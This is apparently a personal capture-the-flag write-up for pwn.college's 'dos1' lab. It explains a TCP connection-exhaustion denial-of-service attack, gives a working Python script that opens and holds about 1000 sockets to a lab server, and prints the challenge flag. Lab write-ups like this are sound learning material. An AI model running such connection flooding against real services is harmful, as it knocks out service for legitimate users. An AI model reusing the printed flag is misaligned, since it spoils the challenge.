---
layout: page
title: "📌 Challenge Summary"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


**Level:** `dos1`  
**Category:** Intercepting Communication → Denial of Service  
**Goal:** Prevent the client at `10.0.0.3` from successfully connecting to the server at `10.0.0.2` on **port 31337**, thereby **denying the service**.

---

# 🧠 Understanding the Setup

- A `ServerHost` listens on `0.0.0.0:31337` and accepts connections.
- A `ClientHost` continuously tries to connect to `10.0.0.2:31337` every second and sends `"Hello, World!\n"`.
- If the client fails to connect (times out), it prints the flag and exits.
- Our host (`10.0.0.1`) is the attacker.

---

# 🔍 How We Exploit It

We want the client to **fail to connect** to the server. We can achieve this by:

- **Holding connections open** to the server from our own host.
- This consumes the server's **limited backlog** (the queue of pending connections).
- As a result, the client's connection attempt will **timeout or get refused**.

This is known as a **TCP connection exhaustion** DoS attack.

---

# 🧪 Attack Plan

1. Create many TCP sockets in our attacker code.
2. Connect them to `10.0.0.2:31337`.
3. Keep the connections open without sending or receiving any data.
4. This prevents the server from accepting new connections, including the client's.

---

# 💣 Final Exploit

```python
# working/connect.py
import socket
import time

sockets = []
for _ in range(1000):  # Enough to exhaust server socket queue
    try:
        s = socket.socket()
        s.connect(("10.0.0.2", 31337))  # Target the server
        sockets.append(s)
        time.sleep(0.01)  # Slow ramp-up to avoid local crash
    except Exception as e:
        print("Failed:", e)
        break

input("Connections held open. Press Enter to close them.\n")

for s in sockets:
    s.close()
```
### Output 
```
pwn.college{wYBitxJdMcZM-4lyAm3dUQtc6Hc.01N1AjNxwSM0IzMyEzW}
```

---
## Flag
```
pwn.college{wYBitxJdMcZM-4lyAm3dUQtc6Hc.01N1AjNxwSM0IzMyEzW}
```
---
